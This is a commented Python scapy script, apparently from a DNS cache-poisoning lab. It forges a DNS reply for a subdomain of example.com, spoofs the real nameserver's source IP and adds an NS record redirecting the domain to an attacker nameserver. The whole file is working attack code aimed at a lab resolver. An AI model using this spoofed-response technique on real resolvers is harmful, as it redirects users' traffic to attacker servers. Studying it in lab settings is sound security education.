# The creation of the scapy packet to be sent to the DNS server taken from here: https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html the scapy documentation and the lab instructions
from scapy.all import *

# Construct the DNS header and payload
# name - The name of the domain we are trying to mimic
name = 'twysw.example.com'
# domain - The domain we are trying to mimic
domain = 'example.com'
# ns - The name server of the attacker server, were we want to redirect the traffic
ns = 'ns.attacker32.com'
# Qdsec - The DNS question section
Qdsec = DNSQR(qname=name)
# Anssec - The DNS answer section , rrname - The name of the domain we are trying to mimic, type - The type of the DNS record A for IPV4, rdata - some random data, ttl - The time to live of the DNS record
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
# NSsec - The DNS name server section, rrname - The name of the domain we are trying to mimic, type - The type of the DNS record NS for name server, rdata - The name server of the attacker server, were we want to redirect the traffic, ttl - The time to live of the DNS record
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
# dns - The DNS header, id - The id of the DNS packet, aa - Authoritative Answer, rd - Recursion Desired, qr - Query Response, qdcount - Number of questions, ancount - Number of answers, nscount - Number of name server records, arcount - Number of additional records, qd - The question section, an - The answer section, ns - The name server section, ar - The additional section
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,
qdcount=1, ancount=1, nscount=1, arcount=0,
qd=Qdsec, an=Anssec, ns=NSsec)
# Construct the IP, UDP headers, and the entire packet
# ip - The IP header, dst - The destination IP address, src - The source IP address, chksum - The checksum of the IP header
# src is the IP address of the NS server for example.com, we spoof it to trick the DNS server that the response is coming from the NS server, dst is the IP address of the DNS server
# NOTICE: The src IP address found using dig example.com NS, and then dig on the url of the NS server
# there are 2 NS servers for example.com, we can use any of them, 199.43.133.53 or 199.43.135.53
ip = IP(src = '199.43.133.53', dst = '10.9.0.53', chksum=0)  

#  udp - The UDP header, dport - The destination port, sport - The source port, chksum - The checksum of the UDP header
# dport is the port of the DNS server which is 33333 in this LAB to ease the process, sport is the source port of the attacker, which is 53 in this case
udp = UDP(dport=33333, sport=53, chksum=0)

# pkt - The entire packet, ip - The IP header, udp - The UDP header, dns - The DNS header
reply = ip/udp/dns

# Save the packet to a file
with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(reply))
print(reply.show())
